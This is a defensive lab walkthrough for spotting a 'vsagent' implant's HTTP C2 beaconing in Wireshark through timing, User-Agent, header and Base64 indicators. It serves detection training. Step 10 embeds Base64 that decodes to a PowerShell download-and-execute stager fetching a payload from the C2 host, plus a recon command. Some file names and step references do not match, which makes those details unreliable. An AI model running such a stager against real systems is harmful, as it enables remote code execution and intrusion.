# C2 Traffic Analysis - vsagent HTTP Beaconing

**Capture file:** `vsagent_c2.pcap`  

---

## Step 1 - Open The Capture

Open `port_knocking_lab.pcap` in Wireshark

Take a moment to scroll through the packet list. You will see a mix of traffic types - ARP, DNS, NTP, and TCP sessions. The **Protocol** column identifies each one at a glance. Your goal for the rest of the lab is to filter this noise down to just the C2 traffic

---

## Step 2 - The Beacon Concept

- Before filtering, it is worth understanding what you are about to find. A **beacon** is a periodic outbound connection made by an implant back to its operator's server. Instead of holding a persistent TCP session open - which is easy to spot in netflow data - vsagent opens a fresh TCP connection every 30 seconds, sends a single HTTP GET request to `/beacon`, reads the response, and immediately tears the connection down. The short-burst pattern blends into the background noise of ordinary web traffic

- The **beacon interval** is critical for detection. A connection firing every 30 seconds with no user activity, no Referer header, and no browser fingerprint is a strong anomaly. In the steps that follow you will prove the 30-second interval empirically by measuring timestamps between raw **SYN** packets

---

## Step 3 - Filter for SYN Packets to Measure the Beacon Interval

- Click the **Display Filter** bar at the top of the Wireshark window and type the following filter, then press **Enter**:

```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

- This filter shows only TCP packets where the **SYN** flag is set and the **ACK** flag is not - meaning pure SYN packets only, one per new connection attempt. The `&&` operator requires both conditions to be true simultaneously

- Look at the **Time** column. You will see SYN packets from `10.0.0.5` (the implant) to `192.168.56.1` (the C2 controller) spaced approximately **30 seconds apart** - confirming vsagent's beacon interval. You will also notice one SYN that appears roughly 5 seconds after a beacon cycle; that is the exfiltration POST session firing immediately after the implant receives a command

- Note the one earlier SYN from `10.0.0.5` to `10.0.0.1` - that is part of the background noise HTTP session and does not belong to the beacon traffic

---

## Step 4 - Isolate All Traffic Between the Implant and the C2 Controller

- Clear the previous filter and type the following, then press **Enter**:

```
ip.addr == 192.168.56.1
```

- This filter shows every packet that has `192.168.56.1` as either its source or destination address - the entire conversation between the implant and the C2 controller, including the TCP handshakes, HTTP requests, HTTP responses, and teardowns. Everything else (ARP, DNS, NTP, and the background HTTP session to `10.0.0.1`) disappears from view

- You can immediately see the repeating structure: groups of TCP packets at regular intervals, each group representing one full beacon cycle - handshake, request, response, teardown

---

## Step 5 - Identify the vsagent User-Agent String

- With the `ip.addr == 192.168.56.1` filter still active, look for any packet flagged as **HTTP** in the Protocol column. Click on one of the `GET /beacon` packets to select it.

- In the **Packet Details** pane, expand **Hypertext Transfer Protocol** -> **GET /beacon HTTP/1.0** -> look for the **User-Agent** header line



- You will see `User-Agent: vsagent/1.0` hardcoded in every single GET and POST the implant sends. Real browsers produce long, varied strings that include the browser name, version, operating system, and rendering engine - and those strings change with every update. A fixed, non-browser **User-Agent** string appearing at perfectly regular intervals is a **hard indicator** you can write a SIEM detection rule around immediately

- To confirm this, apply the following display filter to isolate every packet carrying that string:

```
http.user_agent == "vsagent/1.0"
```

- Every returned packet is a C2 transaction. Note the count in the status bar at the bottom of the Wireshark window

---

## Step 6 - Isolate All HTTP GET Beacons

- Apply the following display filter:

```
http.request.method == "GET" && http.request.uri == "/beacon"
```

- Each row is one of vsagent's periodic check-in requests. Click on any one of them and expand **Hypertext Transfer Protocol** in the Packet Details pane. Notice what is absent compared to browser traffic: there is no `Referer:` header, no `Accept-Encoding:`, no `Cookie:`, and no session tokens. The only headers are `Host:` and `User-Agent:`. Legitimate browsers always send at least four or five headers; this stripped-down request is a textbook **implant fingerprint**

---

## Step 7 - Find the C2 Command Delivery

- Apply the following display filter to show only HTTP responses from the C2 server:

```
http.response && ip.src == 192.168.56.1
```

- Click through the responses one by one and expand **Hypertext Transfer Protocol** -> **HTTP response body** (or **Line-based text data**) in the Packet Details pane

- Most responses will show `cmd=` with nothing after it - those are **idle** check-ins telling the implant to try again next cycle. At least one response will show `cmd=` followed by a long string of alphanumeric characters ending in one or two `=` signs

- That trailing `=` padding is one of the most reliable visual indicators of **Base64** encoding: because Base64 encodes three bytes at a time, any plaintext whose length is not a multiple of three requires `=` or `==` padding to fill the final group

- Right-click the body field containing `cmd=<base64>` in the Packet Details pane -> **Copy** -> **as ASCII Text** to copy the **cmd=...** string for decoding in Step 11

---

## Step 8 - Find the Exfiltration POST

- Apply the following display filter:

```
http.request.method == "POST"
```

- You will see a single `POST /beacon` request from the implant to the C2 controller. This fires roughly 5 seconds after the tasked GET/response exchange - the time the implant needed to execute the command and collect its output

- Click on the POST packet and expand **Hypertext Transfer Protocol** -> **HTML Form URL Encoded** in the Packet Details pane. You will see the field name `output=` followed by a **Base64** encoded blob

- The POST uses the same `User-Agent: vsagent/1.0` and the same stripped-down header set as the GETs. Using the same URI path `/beacon` for both check-ins and exfiltration is deliberate - it makes it harder for rules watching for unusual URIs to flag exfiltration separately from beaconing

---

## Step 9 - Examine the Full Beacon Cycle with Follow TCP Stream

- Clear the display filter. Right-click on any one of the C2 `GET /beacon` packets and select **Follow** -> **TCP Stream**

- Wireshark will reconstruct the entire TCP conversation and display it in a new window. The **red** text is data sent by the implant (`10.0.0.5`) and the **blue** text is data sent by the C2 server (`192.168.56.1`). This view lets you see the full HTTP request and response in one place - the sparse GET headers in red, and the `cmd=` response body in blue

- Try following the TCP stream of the POST session as well - you will see the `output=<base64>` body in red and the C2 server's `ok` acknowledgement in blue

- Close the TCP Stream window when done

---

## Step 10 - Decode the C2 Command with Python

- Switch back to the terminal. Take the Base64 strings you found after `cmd=` in Step 8 and substitute it below

>[!NOTES]
>Here are the 2 strings for simplicity:
>
>SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC41Ni4xL3BheWxvYWQucHMxJyk=
>
>d2hvYW1pOyBob3N0bmFtZTsgaXBjb25maWcgL2FsbA==

```bash
python3 -c "import base64; print(base64.b64decode('<paste_base64_here>').decode())"
```

- `import base64` loads Python's built-in Base64 library. `base64.b64decode(...)` decodes the string from Base64 back to raw bytes, `.decode()` converts those bytes to a UTF-8 string, and `print(...)` writes it to the terminal

- When decoded, you will see a **PowerShell download-and-execute** stager. `IEX` is the PowerShell `Invoke-Expression` cmdlet, which executes a string as code. `New-Object Net.WebClient` creates an HTTP client, `.DownloadString(...)` fetches the remote URL as text, and `IEX` executes whatever PowerShell is returned - pulling a second-stage payload into memory without ever writing it to disk

---

## Step 11 - Decode the Exfiltrated Output with Python

- Take the Base64 string you found after `output=` in Step 9 and substitute it below

>[!NOTES]
>Here is the string for simplicity:
>
>Q09SUFxqc21pdGgNCiBWb2x1bWUgaW4gZHJpdmUgQyBoYXMgbm8gbGFiZWwuDQogVm9sdW1lIFNlcmlhbCBOdW1iZXIgaXMgQTFCMi1DM0Q0DQogRGlyZWN0b3J5IG9mIEM6XFVzZXJzXGpzbWl0aFxEb2N1bWVudHMNCjAzLzEyLzIwMjYgIDA5OjE1IEFNICAgIDxESVI+ICAgICAgICAgIC4NCjAzLzEyLzIwMjYgIDA5OjE1IEFNICAgIDxESVI+ICAgICAgICAgIC4uDQowMy8xMi8yMDI2ICAwODo0NCBBTSAgICAgICAgICAgICAxLDAyNCBub3Rlcy50eHQNCjAzLzEyLzIwMjYgIDA5OjEwIEFNICAgICAgICAgICAgMTIsMjg4IHJlcG9ydC5kb2N4DQogICAgICAgICAgICAgICAyIEZpbGUocykgICAgICAgICAxMywzMTIgYnl0ZXMNCiAgICAgICAgICAgICAgIDIgRGlyKHMpICA0NSw2NzgsOTAxLDIzNCBieXRlcyBmcmVlDQo=

```bash
python3 -c "import base64; print(base64.b64decode('<paste_base64_here>').decode())"
```

- The decoded output reveals exactly what data the implant shipped to the operator - a `whoami` result showing the compromised user's domain identity, followed by a directory listing of their Documents folder. The operator now knows who they are running as and what files are on the system. This kind of initial access reconnaissance is a standard first step after landing on a new host



